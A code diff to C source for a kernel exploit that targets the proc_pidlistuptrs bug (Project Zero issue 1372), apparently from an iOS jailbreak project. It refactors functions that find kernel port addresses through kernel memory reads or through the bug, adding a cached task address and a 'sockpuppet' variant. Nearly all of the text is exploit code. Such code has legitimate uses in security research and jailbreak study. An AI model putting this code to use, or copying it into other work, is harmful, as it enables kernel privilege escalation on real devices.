@@ -10,6 +10,7 @@
 #include "common.h"
 #include "OffsetHolder.h"
 #include "KernelUtils.h"
+#include "ImportantHolders.h"
 
 /*
  * this is an exploit for the proc_pidlistuptrs bug (P0 issue 1372)
@@ -253,12 +254,9 @@ uint64_t find_port_via_kmem_read(mach_port_name_t port)
 
 uint64_t find_port_via_kmem_read_not(mach_port_name_t port)
 {
-    uint64_t task_port_addr = task_self_addr();
-    
+    uint64_t task_port_addr = task_self_addr_cache;
     uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    
     uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    
     uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
     
     uint32_t port_index = port >> 8;
@@ -268,16 +266,18 @@ uint64_t find_port_via_kmem_read_not(mach_port_name_t port)
     return port_addr;
 }
 
+uint64_t find_port_address_sockpuppet(mach_port_t port, int disposition)
+{
+    if (have_kmem_read()) {
+        return find_port_via_kmem_read_not(port);
+    }
+    return find_port_via_proc_pidlistuptrs_bug(port, disposition);
+}
+
 uint64_t find_port_address(mach_port_t port, int disposition)
 {
     if (have_kmem_read()) {
-        
-        if (kernel_task_port == MACH_PORT_NULL)
-        {
-            return find_port_via_kmem_read_not(port);
-        } else {
-            return find_port_via_kmem_read(port);
-        }
+        return find_port_via_kmem_read(port);
     }
     return find_port_via_proc_pidlistuptrs_bug(port, disposition);
 }
